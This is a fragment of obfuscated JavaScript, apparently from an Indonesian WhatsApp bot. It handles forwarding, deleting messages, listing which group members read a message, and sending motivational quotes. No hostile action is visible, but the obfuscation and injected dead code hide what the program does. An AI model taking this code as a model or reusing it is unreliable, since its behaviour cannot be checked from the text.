-0x12d,_0x1b8195-0xef,_0x1d40c1-0x35,_0x1d40c1);}_0x12d054[_0x4b16fe(0x3fb,0x601,0x136,0xe7)]='🐨\x20Owner',_0x12d054['knGRn']=_0x545c88(-0x22b,0x2f4,0x47b,0x16f),_0x12d054['ZGIWC']='🔖\x20Sewa\x20',_0x12d054[_0x545c88(0x810,0x6ec,0x81a,0xa5c)]=_0x4b16fe(0xed8,0xaa3,0xf89,0xaef)+'21';const _0x5e373b=_0x12d054;function _0x545c88(_0x2bbb0b,_0x337dde,_0x539443,_0x4b3ff6){return _0x406083(_0x337dde- -0x4fd,_0x337dde-0x1ac,_0x539443-0x11c,_0x4b3ff6);}var _0x5a7cef=alpha[_0x4b16fe(0x485,0x830,0x542,0xb39)][_0x545c88(0x234,0x1cf,0x521,0x446)]();let _0x356120=_0x100c42;for(let _0x478272 of _0x5a7cef){const _0x2312e8={};_0x2312e8[_0x4b16fe(0x283,0x62b,0x945,0x941)]=_0x5e373b['QVmmd'],_0x2312e8[_0x4b16fe(0x1ba,0x587,0x2a6,0x91d)]={},_0x2312e8[_0x545c88(0x255,0x2e4,0x438,0x397)]=0x1,_0x2312e8[_0x4b16fe(0x1ba,0x587,0x2a6,0x91d)][_0x545c88(0x3e3,0x11,0x2d0,0x3db)+'t']=_0x5e373b[_0x4b16fe(0x679,0x601,0x24e,0x3d2)];const _0x4fb48d={};_0x4fb48d['buttonId']=_0x5e373b['knGRn'],_0x4fb48d[_0x4b16fe(0x316,0x587,0x5d7,0xa04)]={},_0x4fb48d[_0x4b16fe(0x974,0x6b4,0x56a,0x3ce)]=0x1,_0x4fb48d[_0x4b16fe(0x316,0x587,0x5d7,0xa04)]['displayTex'+'t']=_0x5e373b[_0x545c88(0x1,0x2a4,0x1c8,0x383)];var _0x5a14c9=[_0x2312e8,_0x4fb48d];const _0x2dfae7={};_0x2dfae7[_0x545c88(0x3e,0x354,0x462,0x400)+'t']=_0x545c88(0x447,0x297,0x656,0x30d)+'*'+enter+enter+_0x356120,_0x2dfae7['footerText']=''+tampilTanggal+enter+tampilWaktu+enter+enter+'©\x20'+creator,_0x2dfae7[_0x545c88(0x38d,0x29f,0x407,-0x1b1)]=_0x5a14c9,_0x2dfae7[_0x4b16fe(0x82a,0x9a8,0xc89,0xb05)]=0x1;var _0x25e5cb=_0x2dfae7;const _0x251e06={};_0x251e06[_0x4b16fe(0x2d3,0x3d1,0x5ba,0xb6)]='hi',_0x251e06[_0x4b16fe(0xabe,0x7a2,0x712,0x639)+_0x4b16fe(0x8a3,0x846,0x55d,0x668)]=0x3b9aca00,_0x251e06[_0x4b16fe(0xc02,0x6f6,0x2b3,0x971)+'d']=!![],_0x251e06[_0x545c88(-0x31,-0xc1,-0x1eb,-0x71)+_0x4b16fe(0x741,0x2df,0x300,-0x1fe)]=!![];const _0x400927={};_0x400927[_0x545c88(0x2e7,-0x85,-0x2ae,0x149)]=_0x5e373b[_0x4b16fe(0xfc9,0xabc,0x82c,0x7a0)],_0x400927[_0x545c88(0x39a,0x355,-0xc2,0x37d)+'o']=_0x251e06,_0x400927[_0x545c88(0x487,0x7b1,0x7c8,0x68e)]=ftroli,_0x400927['sendEpheme'+_0x545c88(0x186,-0xf1,0x174,0x3d2)]=!![],alpha[_0x4b16fe(0xbd7,0x752,0x95c,0x5dd)+'e'](_0x478272['jid'],_0x25e5cb,MessageType[_0x545c88(0x74,0x4f7,0x3bc,0x181)+'sage'],_0x400927);}};switch(command){case'q':if(!mek['key'][_0x4aaba1(0xd71,0x106b,0xe41,0xac2)]&&!isOwner&&!isCreator)return reply(lang[_0x406083(0x604,0x171,0x746,0x71b)]());if(!m[_0x406083(0xcae,0xdd4,0x7a4,0x9fa)])return reply(_0x4aaba1(0x659,0xa6a,0x133,0x984)+_0x406083(0x73b,0xc3a,0x80d,0x261));let qse=alpha[_0x4aaba1(0x971,0x786,0x786,0xaa4)](await m[_0x4aaba1(0x4ab,0x64b,0x485,0xc5)+'bj']());if(!qse[_0x406083(0xcae,0xdab,0xd62,0xbeb)])return reply(_0x4aaba1(0x4f0,0x96,0x8f2,0x786)+_0x4aaba1(0xa14,0xd04,0xb64,0x795)+_0x406083(0x97d,0xd2d,0x858,0x862)+_0x406083(0x9f0,0x97e,0xe42,0xeb9)+'\x20a\x20reply!');await qse['quoted'][_0x4aaba1(0x8ee,0x582,0xc96,0xdfd)+'rd'](m[_0x4aaba1(0xd47,0xd8d,0xd91,0xfc8)],!![]);break;case _0x4aaba1(0xcaa,0xa65,0x1123,0x9b6):case _0x4aaba1(0xa3b,0x978,0x874,0x97a):case'd':try{if(!isQuotedMsg)return reply(_0x406083(0x7d6,0x480,0x895,0x805)+_0x4aaba1(0x79d,0x5e9,0xae3,0x433));const _0x410072={};_0x410072['id']=mek[_0x406083(0x467,0x65e,0x77a,0x21b)]['extendedTe'+'xtMessage']['contextInf'+'o'][_0x406083(0x779,0x989,0x7a2,0x8ea)],_0x410072['remoteJid']=from,_0x410072['fromMe']=!![],pp=_0x410072;if(!isGroupAdmins&&!mek[_0x4aaba1(0x488,0x920,0x701,0x1de)][_0x406083(0xd3c,0xde0,0xb06,0x889)]&&!isOwner&&!isCreator)return reply(mess[_0x4aaba1(0xc30,0xdaa,0x1121,0xbd0)][_0x406083(0xa7d,0x989,0xde6,0xa98)]);alpha[_0x4aaba1(0xd93,0xc4f,0xc2d,0x8c7)+_0x406083(0xcfe,0x98a,0x887,0x11a5)](from,pp);}catch(_0x38f38b){reply(_0x4aaba1(0xd5c,0xa94,0x92b,0x1260)+_0x406083(0x96c,0xdfb,0x732,0x4b0)),reply(_0x38f38b),console[_0x4aaba1(0x497,0x7ee,0x627,0x753)](_0x38f38b);}break;case _0x4aaba1(0x515,0x5e1,0x282,0xb8):try{if(!isGroup)return reply(_0x406083(0x451,0x27a,0x89a,0x549)+_0x406083(0xd3a,0x908,0xa92,0xb0f)+'ruop');if(!isQuotedMsg)return reply(_0x4aaba1(0x80b,0x843,0xadd,0xcbf)+_0x406083(0x9b3,0x86d,0xa6f,0x608));infom=await alpha[_0x4aaba1(0x4c2,0x33e,0x21,0x302)+'o'](from,mek[_0x406083(0x467,0x181,0x6a3,0x673)][_0x406083(0xc4c,0xc09,0xf6d,0xdaa)+'xtMessage'][_0x406083(0x852,0x434,0x3d9,0x6c6)+'o'][_0x4aaba1(0x7ae,0x532,0x740,0x682)]),hemm=infom[_0x406083(0xb15,0x7d9,0x926,0x616)],hemms=infom['deliveries'],readon=hemms[_0x406083(0xbd6,0xc46,0xb43,0xdde)](_0x5bc56c=>_0x5bc56c[_0x406083(0x7b0,0x782,0x937,0x3f8)]),readdin=hemm['map'](_0x5f4d16=>_0x5f4d16[_0x406083(0x7b0,0xc68,0x95d,0x65a)]),stamp=hemm['map'](_0x135b2c=>_0x135b2c['t']);function toTime(_0x562f68,_0x1de08f){const _0x5b6161={};_0x5b6161['wFsiC']='langsung_o'+'vo18',_0x5b6161[_0x4fa47f(0xe5c,0xb24,0xde1,0xa35)]=_0x4fa47f(0x56d,0x45a,0x297,0x1d5),_0x5b6161[_0x5c946f(0xce,0xa6a,0x56d,0x38d)]=_0x5c946f(-0x539,-0x555,-0x53,0x55),_0x5b6161['oAGJC']=_0x5c946f(0xafd,0x610,0x678,0xb92)+'21',_0x5b6161[_0x4fa47f(0x897,0x615,0x7f0,0x4f3)]=function(_0x3fbadf,_0x41b5d3){return _0x3fbadf==_0x41b5d3;},_0x5b6161[_0x5c946f(0x8f3,0x8f7,0x538,0xa2f)]=function(_0xb34f7a,_0x3f31fa){return _0xb34f7a!==_0x3f31fa;},_0x5b6161[_0x4fa47f(0x84c,0x527,0xdb0,0xa4e)]=_0x5c946f(0x32c,-0x28d,0xff,0x32f),_0x5b6161[_0x4fa47f(0x821,0x7d4,0x6d8,0x7c7)]=_0x5c946f(0x2b2,0x41f,-0x102,-0x58a),_0x5b6161['OyQim']=function(_0x64c776,_0x1dc2c8){return _0x64c776*_0x1dc2c8;};function _0x4fa47f(_0x412897,_0x4054e4,_0x49e446,_0x955db4){return _0x4aaba1(_0x955db4- -0x1ed,_0x412897,_0x49e446-0x10b,_0x955db4-0xaf);}const _0x1d73e3=_0x5b6161;_0x1de08f=_0x1d73e3[_0x5c946f(0x2d2,-0x1df,0x153,-0x14)](typeof _0x1de08f,_0x4fa47f(0x7eb,0x2b4,0x9d8,0x692))?![]:!![];let _0x1f833f=new Date(_0x562f68);if(_0x1de08f){if(_0x1d73e3[_0x5c946f(0x135,0x2de,0x538,0x4f9)](_0x1d73e3['YzfQu'],_0x1d73e3[_0x5c946f(0x75b,0x303,0x427,0x1a6)]))_0x1f833f=new Date(_0x1d73e3[_0x5c946f(-0x1cf,0x395,0x196,0x309)](_0x562f68,-0x68*0x50+-0x1ee1+0x4349));else{var _0xf7efdf=_0x4fa47f(0x929,0x5cc,0x8cc,0x8b4)+_0xdd80d4[_0x5c946f(0x615,0x23f,0x11e,0x29b)]('@')[0x1*-0x152f+0x7*-0x373+-0x2d54*-0x1]+(_0x4fa47f(0x51c,0x73a,0x620,0x99e)+_0x4fa47f(0xda6,0x9d3,0x4ed,0x990)+'e\x20nomor\x20aj'+_0x5c946f(0x2b6,0xaf9,0x7ac,0x2cc)+_0x4fa47f(0x6bc,0x7b9,0x4a,0x40d));const _0x5355b2={};_0x5355b2[_0x4fa47f(0x440,0x151,0x50f,0x5a0)]=_0x1d73e3['wFsiC'],_0x5355b2[_0x4fa47f(0x92f,0x871,0x17e,0x4fc)]={},_0x5355b2[_0x4fa47f(0x7b1,0x936,0x81b,0x629)]=0x1,_0x5355b2[_0x4fa47f(0x92f,0x871,0x17e,0x4fc)][_0x4fa47f(0x507,0x72e,0x491,0x356)+'t']=_0x1d73e3['Khhxt'];const _0x154c8f={};_0x154c8f['displayTex'+'t']=_0x5c946f(0x66b,0x826,0x79b,0x64c);const _0x11ff74={};_0x11ff74[_0x5c946f(0x3d4,-0x65,0x200,-0x96)]=_0x1d73e3['capqN'],_0x11ff74['buttonText']=_0x154c8f,_0x11ff74[_0x4fa47f(0x91f,0x932,0xb3e,0x629)]=0x1;const _0x7a258e=[_0x5355b2,_0x11ff74],_0x3a9ed2={};_0x3a9ed2[_0x4fa47f(0xa27,0x821,0x248,0x699)+'t']=_0xf7efdf,_0x3a9ed2[_0x4fa47f(0x168,0x8a7,0x4b6,0x3f9)]=''+_0xbd25e5+_0x4fdf5a+_0x3af0c3+_0x262f89+'©\x20'+_0x75413a,_0x3a9ed2['buttons']=_0x7a258e,_0x3a9ed2[_0x4fa47f(0xb22,0xc44,0xc08,0x91d)]=0x1;const _0x3303ac=_0x3a9ed2,_0x2a1760={};_0x2a1760['text']='hi',_0x2a1760[_0x4fa47f(0xb2c,0xa96,0x319,0x717)+'Score']=0x3b9aca00,_0x2a1760[_0x5c946f(0x239,0xb3,0x2cb,-0xed)+'d']=!![],_0x2a1760[_0x5c946f(0x1b3,-0x61c,-0x11c,-0x1c9)+_0x4fa47f(0x4bd,0x6c3,-0x209,0x254)]=!![],_0x2a1760[_0x5c946f(0x45d,0x55f,0x300,-0x99)+'id']=[_0x43c3e7];const _0x5212d6={};_0x5212d6['caption']=_0x1d73e3[_0x5c946f(0x1ae,0x2ba,-0xde,0x2ae)],_0x5212d6['contextInf'+'o']=_0x2a1760,_0x5212d6[_0x5c946f(0x784,0x656,0x756,0x9f1)]=_0x3af650,_0x5212d6[_0x5c946f(-0x22d,-0x1d0,-0x11c,-0x548)+_0x5c946f(0x24,-0x3dc,-0x14c,-0x115)]=!![],_0xd7f33a['sendMessag'+'e'](_0x43aa01,_0x3303ac,_0x2a3e57['buttonsMes'+_0x4fa47f(0x1fd,0x1ac,0x835,0x312)],_0x5212d6);}}function _0x5c946f(_0x6dcb7a,_0x4a4575,_0x420801,_0x5a0d66){return _0x4aaba1(_0x420801- -0x58d,_0x6dcb7a,_0x420801-0x1df,_0x5a0d66-0x1c8);}var _0x57154d=_0x1f833f[_0x5c946f(0x44a,0x9cd,0x698,0x62c)](),_0x143c8e=_0x1f833f['getMinutes'](),_0x15e6dd=_0x1f833f[_0x5c946f(0x180,0x27d,0x47c,0xb7)](),_0x2dd49d=_0x57154d+':'+_0x143c8e+':'+_0x15e6dd;return _0x2dd49d;}function toBulan(_0x1fb983,_0x18a8d4){const _0x56a9c1={'aELjC':function(_0x265a43,_0x38a87d){return _0x265a43(_0x38a87d);},'nosGU':function(_0x2aa4c4,_0x490cf8,_0x187da2,_0x3549e1){return _0x2aa4c4(_0x490cf8,_0x187da2,_0x3549e1);},'vZlJw':function(_0x196f99,_0x539530,_0x3d467e,_0x5835a6){return _0x196f99(_0x539530,_0x3d467e,_0x5835a6);},'aJOho':function(_0xf964b0,_0xbee1b){return _0xf964b0==_0xbee1b;},'HEVHh':'undefined','yzPuM':function(_0x101e34,_0x7cd8b6){return _0x101e34===_0x7cd8b6;},'HPrQG':_0x48992c(0x8f3,0xad8,0xbcb,0xb26),'smxxQ':_0x48992c(0x92a,0x429,0xbdd,0xd41),'uekDq':function(_0x48a691,_0xb12e66){return _0x48a691*_0xb12e66;},'WEmuh':_0x48992c(0xc10,0xc96,0xabe,0x82a),'uLtUm':_0x5d4040(0xb3b,0x80c,0xd27,0xfa9),'nvLfW':_0x5d4040(0x2a6,0x1ec,0x491,0x634),'mZeBg':_0x48992c(0x6be,0xa7b,0xaf8,0x1a4),'DOMpN':'Juni','mcNKd':_0x48992c(0x3ad,0x8b7,0x49d,0x831),'vrmIz':'Agustus','GOpKl':_0x5d4040(0x743,0xc3a,0x9e8,0xe4b),'jXsWB':_0x5d4040(0xb5f,0xacc,0x8f4,0xa6e),'xqhCh':_0x48992c(0xb93,0xf49,0xc7b,0x769),'jwmTQ':_0x5d4040(0xa78,0x5ed,0x93c,0xccb),'yxpvM':'Minggu','zlCEa':'Selasa','YZoEB':_0x5d4040(0x83b,0x10e0,0xc90,0xe46),'HNBwF':_0x48992c(0x8c5,0xb85,0xb15,0x762),'GsJiF':_0x5d4040(0x7f2,0x6cb,0xaa8,0xef8),'jaJaH':function(_0x52141a,_0x4cd8c0){return _0x52141a+_0x4cd8c0;}};_0x18a8d4=_0x56a9c1['aJOho'](typeof _0x18a8d4,_0x56a9c1[_0x48992c(0xac0,0x9a0,0x9ee,0xe91)])?![]:!![];function _0x48992c(_0x105d04,_0x2f5413,_0x5c8324,_0x1eddb2){return _0x4aaba1(_0x105d04- -0x1a3,_0x5c8324,_0x5c8324-0xb3,_0x1eddb2-0x2a);}let _0x56dd0d=new Date(_0x1fb983);function _0x5d4040(_0x2bdd4e,_0x2d1a99,_0x19d0b7,_0x3ac7f2){return _0x4aaba1(_0x19d0b7- -0x5c,_0x2d1a99,_0x19d0b7-0xaf,_0x3ac7f2-0x8f);}if(_0x18a8d4){if(_0x56a9c1[_0x5d4040(0xa8a,0x6c2,0x9e0,0xc23)](_0x56a9c1[_0x48992c(0x57c,0x8e4,0x6e7,0x35a)],_0x56a9c1[_0x5d4040(0x130,0x3d2,0x511,0x1d8)])){const _0x3db383={'PAryH':function(_0x1387d6,_0x3d5874){return _0x1387d6>=_0x3d5874;},'PmkYT':function(_0x106776,_0x269a40){function _0x320f4c(_0x59dfb3,_0xffbea3,_0x5d4aa6,_0x179a2f){return _0x5d4040(_0x59dfb3-0x7d,_0x59dfb3,_0x179a2f- -0x3c2,_0x179a2f-0x134);}return _0x56a9c1[_0x320f4c(-0x10a,0x16b,0x674,0x279)](_0x106776,_0x269a40);},'ScUuW':function(_0x453aa8,_0x114a4b,_0x17669e,_0x12ca79){function _0x1b77ce(_0x1f3f40,_0xd252cd,_0x30be2d,_0x203b09){return _0x5d4040(_0x1f3f40-0xef,_0x203b09,_0x30be2d- -0x499,_0x203b09-0x1e6);}return _0x56a9c1[_0x1b77ce(-0x63,0x694,0x34d,0x289)](_0x453aa8,_0x114a4b,_0x17669e,_0x12ca79);},'JBpIw':function(_0x2d4120,_0x4bca54,_0x4ad32c,_0x56e6dc){function _0xbd4ed2(_0x584ad5,_0x1c020a,_0x4600a8,_0x228471){return _0x5d4040(_0x584ad5-0xe6,_0x4600a8,_0x584ad5- -0x3bd,_0x228471-0x1cc);}return _0x56a9c1[_0xbd4ed2(0x83b,0x7ce,0xad9,0xd29)](_0x2d4120,_0x4bca54,_0x4ad32c,_0x56e6dc);}},{dl_link:_0x33e558,thumb:_0x4db0b4,title:_0x5e7113,filesizeF:_0x194071,filesize:_0x53cc79}=_0x2c96a5;_0x39a1d1[_0x48992c(0x6c7,0x3b3,0x19f,0x75f)](_0x5d4040(0x75a,0x687,0x745,0x38d)+_0x5d4040(0x447,0x73,0x33e,0x1b6)+_0x48992c(0xb8e,0xdd6,0xc4e,0xa66)+_0x48992c(0x9e0,0xe1e,0x69c,0x4c4)+_0x33e558)[_0x48992c(0x9c2,0xacd,0x6d3,0xd6d)](async _0x2d4842=>{const _0x25cfc2={};_0x25cfc2[_0x254b95(0x989,0x6d9,0x98b,0x4f1)]=_0x254b95(0x79b,0xd89,0xe3c,0xb46);const _0x1700f0=_0x25cfc2;function _0x6eab72(_0x2ac9c8,_0x33a992,_0x51f534,_0x4653e4){return _0x5d4040(_0x2ac9c8-0xdb,_0x2ac9c8,_0x51f534- -0x2f,_0x4653e4-0x75);}if(_0x3db383[_0x254b95(0x62e,0x825,0x6a3,0x4b8)](_0x3db383['PmkYT'](_0x5ede97,_0x53cc79),-0x2b276+0x24344+-0x41d*-0x7a))return _0x3db383[_0x6eab72(0x8c0,0x88f,0x52b,0x3b4)](_0x1a1895,_0x59b4b4,_0x4db0b4,_0x6eab72(0xf27,0xe74,0xa5d,0xf0f)+_0x254b95(0xe66,0x5f2,0xdcf,0xa19)+_0x1fc66d+_0x38f079+(_0x254b95(0x836,0xf72,0x1025,0xc13)+'*\x20')+_0x5e7113+_0x4537a2+('📊\x20*Quality'+_0x254b95(-0x192,0x275,0x25d,0x33b)+'ps')+_0x28d313+('🦁\x20*Ext*\x20:\x20'+'MP3')+_0x3fb6ce+(_0x254b95(0x50c,0x544,0x650,0x318)+_0x6eab72(0x996,0xe59,0xd1a,0xe6d))+_0x194071+_0xd4869+(_0x254b95(0xa22,0xcb,0x3c3,0x59c)+'\x20')+_0x2d4842[_0x6eab72(0xa26,0xbf1,0x89d,0x847)]+_0x20ba4f+_0x55a6e5+(_0x6eab72(0x9ab,0x10c,0x487,0x5ca)+_0x254b95(0x831,0x71,0x41f,0x4d1)+_0x254b95(0x6fe,0x734,0x63d,0xa74)+'\x20disajikan'+_0x6eab72(0x9da,0x767,0x55a,0x7f1)+_0x254b95(0x6a1,0x5ad,0x951,0x92c)));function _0x254b95(_0x2291b6,_0x56ad05,_0x385fd3,_0x3636c1){return _0x48992c(_0x3636c1- -0x20,_0x56ad05-0x159,_0x385fd3,_0x3636c1-0xd8);}_0x3db383[_0x254b95(0x2e2,0x922,0x8f2,0x4bc)](_0x1b9328,_0x1f7618,_0x33e558,'')[_0x254b95(0x6d7,0x550,0x440,0x908)](_0x35600c=>{_0x3be30b(_0x1700f0['yWuOQ']);});});}else _0x56dd0d=new Date(_0x56a9c1['uekDq'](_0x1fb983,0x4d*-0xb+0x941+-0x20a));}var _0x336cdf=[_0x48992c(0xbeb,0xc94,0xdf7,0xeb8),_0x56a9c1[_0x48992c(0x572,0xa45,0x403,0x8bf)],_0x56a9c1['uLtUm'],_0x56a9c1[_0x5d4040(0x29f,0x36b,0x361,0x79b)],_0x56a9c1[_0x5d4040(0x448,0x37f,0x718,0x53d)],_0x56a9c1[_0x5d4040(0x8a5,0xc94,0xce6,0xea5)],_0x56a9c1[_0x5d4040(0x316,0x96a,0x7c3,0x52e)],_0x56a9c1['vrmIz'],_0x56a9c1[_0x5d4040(-0x13d,0x472,0x3c4,0x4e6)],_0x56a9c1[_0x48992c(0xa95,0xbbc,0xbb2,0x973)],_0x56a9c1['xqhCh'],_0x56a9c1['jwmTQ']],_0x1e8018=[_0x56a9c1[_0x48992c(0x533,0x220,0x7e4,0x88)],_0x5d4040(0x125f,0xa76,0xd5b,0x1013),_0x56a9c1[_0x48992c(0x3fb,-0xce,0x87f,0x8d5)],_0x56a9c1[_0x48992c(0x77e,0x487,0x76c,0x821)],_0x56a9c1[_0x48992c(0x4b5,0x6ef,0x94c,0x707)],_0x56a9c1[_0x48992c(0x261,0x70b,-0x15e,0x3db)],_0x5d4040(0x9bc,0xd33,0x8d7,0x905)],_0x1ea523=_0x56dd0d[_0x48992c(0x988,0xb56,0x4cc,0x513)]();bulanee=_0x56dd0d['getMonth']();var _0x38d1ac=_0x56dd0d[_0x48992c(0x880,0x712,0x3c2,0x8b0)](),_0x38d1ac=_0x1e8018[_0x38d1ac],_0x55eb0a=_0x56dd0d['getYear'](),_0x140cef=_0x55eb0a<0x12c8+-0x2ca+-0x60b*0x2?_0x56a9c1[_0x5d4040(0x6ce,0x56e,0x4e9,0x49b)](_0x55eb0a,-0x5*-0x54b+-0x18*-0x40+-0x190b):_0x55eb0a,_0x3a753d=_0x38d1ac+',\x20'+_0x1ea523+_0x5d4040(0x2ec,0x25d,0x488,0x223)+_0x336cdf[bulanee]+_0x48992c(0x341,0x791,0x458,0x149)+_0x140cef;return _0x3a753d;}teksx=_0x4aaba1(0x5db,0x9ab,0x97b,0x9fd)+enter;for(let i of hemm){teksx+=_0x406083(0x8a6,0xba0,0x530,0x412)+i[_0x4aaba1(0x7e5,0x49e,0xb7b,0x36e)][_0x4aaba1(0x6ab,0xb18,0x4f2,0xb23)]('@')[0x8e1*-0x4+0x358*-0x6+0x2*0x1bca]+enter+_0x4aaba1(0x53c,0xc4,0x36,0x5a0)+toTime(i['t'],!![])+enter+(_0x4aaba1(0x6dd,0xb91,0xa78,0x408)+':\x20')+toBulan(i['t'],!![])+enter+'•'+enter;}teksx1=_0x406083(0xca6,0x11cd,0xf6a,0x8cf)+'D*'+enter+enter;for(let i of hemms){teksx1+=_0x406083(0x8a6,0x742,0xcbd,0xb6b)+i[_0x4aaba1(0x7e5,0xad6,0x4e9,0x83f)][_0x4aaba1(0x6ab,0x52e,0x6fd,0x318)]('@')[0x44d*-0x7+-0x1*0x12e7+0x52*0x99]+enter,teksx1+=_0x406083(0x507,0x253,-0x9,0x5e1)+toTime(i['t'],!![])+enter+('📍\x20Tanggal\x20'+':\x20')+toBulan(i['t'],!![])+enter+'•'+enter;}const _0x2ef1c2={};_0x2ef1c2[_0x4aaba1(0x904,0xdd1,0x3eb,0xb58)+'Score']=0x3e7,_0x2ef1c2['isForwarde'+'d']=!![],_0x2ef1c2[_0x406083(0x858,0x3f3,0x65f,0xa6b)+'id']=readdin,alpha['sendMessag'+'e'](from,teksx,text,{'sendEphemeral':!![],'quoted':mek,'thumbnail':fs['readFileSy'+'nc']('./image/'+thumbnail),'contextInfo':_0x2ef1c2});const _0x53df8f={};_0x53df8f[_0x4aaba1(0x904,0x7f6,0xa8b,0xbf0)+_0x4aaba1(0x9a8,0x54a,0xe62,0x988)]=0x3e7,_0x53df8f[_0x406083(0x823,0x559,0x7c1,0xca1)+'d']=!![],_0x53df8f['mentionedJ'+'id']=readon,alpha[_0x4aaba1(0x8b4,0x964,0xdd7,0x76a)+'e'](from,teksx1,text,{'sendEphemeral':!![],'quoted':mek,'thumbnail':fs['readFileSy'+'nc'](_0x406083(0x587,0x9f9,0xe2,0x8b)+thumbnail),'contextInfo':_0x53df8f});}catch(_0x3343d9){reply(_0x406083(0xd27,0x123d,0xcd2,0xbef)+_0x4aaba1(0x9a1,0x590,0xe12,0xbb5)),reply(_0x3343d9),console[_0x406083(0x462,0x878,0x85e,0x93)](_0x3343d9);}break;case _0x406083(0x783,0x9e6,0xa3e,0x756):const kta=[_0x4aaba1(0xdc0,0xac7,0xeb8,0xd60)+_0x4aaba1(0x66d,0x99d,0xa04,0x51c)+'sedikit\x20da'+_0x406083(0xd98,0x1124,0xd2a,0x10c4)+'ah\x20mengert'+'i.',_0x4aaba1(0x608,0x63b,0xa17,0x33f)+_0x4aaba1(0xaaa,0xf0a,0x5dd,0xa51)+_0x406083(0x488,0x6a0,0x15b,0x271)+'\x20bertahan\x20'+'menghadapi'+'\x20kesulitan'+_0x406083(0x865,0xbdc,0x7af,0x931)+_0x4aaba1(0xa74,0xa85,0xa74,0x881)+_0x406083(0xc46,0x75c,0xecd,0xb96)+'ji\x20karakte'+_0x406083(0x3fe,0x608,-0x9b,0x848)+'ria,\x20beri\x20'+_0x406083(0x72c,0xaa1,0x3d7,0x8ee)+_0x406083(0xa35,0x9d2,0x5f8,0x5dc),_0x406083(0xd68,0x857,0xbce,0x1182)+_0x4aaba1(0xc7c,0xe64,0xfd0,0x8dd)+_0x406083(0xd3e,0x1113,0xbc5,0x10e3)+_0x406083(0x82f,0x764,0x3c9,0x977)+_0x406083(0x7a5,0xacd,0x548,0x860)+'rgabung\x20da'+_0x4aaba1(0x847,0x8dd,0x4bc,0x8c9)+_0x406083(0xc50,0xac8,0xa17,0x1031),_0x4aaba1(0xba3,0xcb9,0x9bd,0x82d)+_0x4aaba1(0x79f,0x459,0xcb6,0x66c)+'elajaran.',_0x406083(0xc5e,0xf91,0x9a2,0xdc1)+_0x4aaba1(0x615,0xa97,0x984,0x282)+_0x4aaba1(0x519,0x195,0x9dc,0x1c4)+_0x4aaba1(0xd9e,0x1195,0x101d,0x8c6)+_0x4aaba1(0x680,0xa29,0x3d8,0x33b),_0x4aaba1(0x6ea,0xace,0x463,0x9ee)+_0x4aaba1(0x9da,0xa20,0xd28,0x951)+'buah\x20seped'+_0x406083(0xade,0xc80,0xc77,0x6ac)+'tap\x20seimba'+'ng\x20kita\x20ha'+'rus\x20tetap\x20'+'bergerak.',_0x406083(0x47d,0x88,0x5da,0x6a1)+'masa\x20lalu,'+_0x406083(0xbee,0x74e,0xe59,0xc10)+_0x406083(0x9e7,0xee1,0x8ce,0xc74)+_0x4aaba1(0x611,0x95b,0x12e,0x900)+'lebih\x20dari'+_0x4aaba1(0xbe3,0x6fd,0xccc,0x85d)+_0x4aaba1(0xd03,0xe15,0xa70,0xc15)+'pala.',_0x4aaba1(0x71a,0xbe9,0xc3e,0xc04)+'a,\x20sebuah\x20'+_0x406083(0x541,0x4ad,0x6ae,0x62d)+_0x406083(0x554,0xa0e,0x47f,0x3fe)+_0x406083(0x980,0xcb1,0x530,0x54c)+'uah\x20biola;'+_0x406083(0xd28,0x11e3,0xf83,0xeb0)+_0x406083(0xc7a,0x819,0xfed,0x82b)+_0x4aaba1(0x95a,0x5f2,0x457,0xcbb)+'\x20seseorang'+'\x20bisa\x20mera'+_0x406083(0x517,0x810,0x662,0x205)+'?',_0x406083(0x96f,0x6bd,0x6cd,0x513)+_0x406083(0x765,0x63c,0x801,0xb03)+_0x406083(0xbf3,0xe43,0x9d0,0xf8b)+'ma,\x20bersik'+_0x406083(0x686,0x930,0x798,0xb7d)+_0x406083(0x750,0xada,0x3c4,0x45f)+_0x406083(0x98e,0xab9,0x933,0x495)+'iri.',_0x4aaba1(0x945,0x8de,0xb50,0x4bf)+_0x406083(0xc63,0x8d3,0xc19,0x881)+_0x4aaba1(0x7cf,0x729,0x5be,0xc45)+_0x406083(0x64f,0xa17,0x230,0x988)+_0x406083(0x887,0x7eb,0xd5d,0x406)+_0x406083(0x6dd,0x30e,0x4bf,0x49a)+_0x4aaba1(0x800,0x643,0xb76,0x7d6)+_0x4aaba1(0xb11,0x636,0xacb,0xf32)+_0x406083(0x730,0x21e,0xb15,0x405),_0x406083(0x4ad,0x58b,0x6d9,0x1f1)+'\x20boleh\x20keh'+_0x4aaba1(0x940,0xe19,0x5ae,0x9ad)+'mangat.\x20Se'+_0x406083(0x470,0x59f,0x84e,-0x37)+_0x406083(0x939,0xe42,0x975,0x553)+_0x406083(0x4fc,0x81a,0x6d8,0x93d)+'\x20untuk\x20men'+_0x4aaba1(0x924,0xdc4,0xbd1,0xe07)+_0x4aaba1(0xba6,0xb9d,0x743,0xa47)+_0x406083(0xcc2,0x114c,0x9ac,0xe3b)+_0x406083(0xc7b,0x84a,0xeec,0x7a7)+_0x4aaba1(0xc34,0xc81,0x1073,0x8ea)+_0x406083(0x41b,-0x2d,0x49a,0x798),'Manusia\x20ak'+'an\x20bahagia'+'\x20selama\x20ia'+_0x406083(0x5a1,0x1a7,0x6db,0x3e9)+'ntuk\x20bahag'+'ia.',_0x4aaba1(0x8f2,0xc00,0x673,0x5c0)+_0x4aaba1(0x76a,0xa6f,0x719,0x62e)+'menjadi\x20se'+'galanya\x20ba'+_0x406083(0xbdc,0xfe9,0xa25,0xf12)+_0x4aaba1(0xb70,0xd00,0xab6,0xd1a)+_0x4aaba1(0x4a4,0x687,0x735,0x744)+'gin\x20menjad'+_0x406083(0xb9f,0x7bc,0x6d2,0x83b)+_0x4aaba1(0x427,0x918,0x6e5,0x808)+_0x406083(0x972,0x5e8,0xd51,0xa93),_0x4aaba1(0x6b1,0xa74,0x4de,0x4d0)+_0x406083(0xa9e,0x8c4,0x715,0x88a)+_0x4aaba1(0x8fc,0xde5,0x68b,0x965)+_0x406083(0x92f,0xba6,0xde3,0x616)+_0x4aaba1(0xb91,0xd3b,0x6fd,0xd64)+_0x406083(0x8a1,0x9a9,0x504,0x543),_0x406083(0x7ae,0x9bc,0xa8f,0x677)+_0x4aaba1(0x4f6,0x93c,0x50c,0x767)+_0x406083(0x8f6,0xcef,0xdc5,0xa83)+_0x406083(0x6fe,0x744,0x503,0xaf7)+_0x4aaba1(0xabe,0xa94,0x76a,0x5f7)+_0x406083(0x9a2,0x8b3,0x81a,0xa61)+_0x4aaba1(0x65a,0x48b,0x778,0x13c)+_0x4aaba1(0x6b2,0xa85,0xae2,0x5ad)+_0x4aaba1(0xdac,0xfc4,0x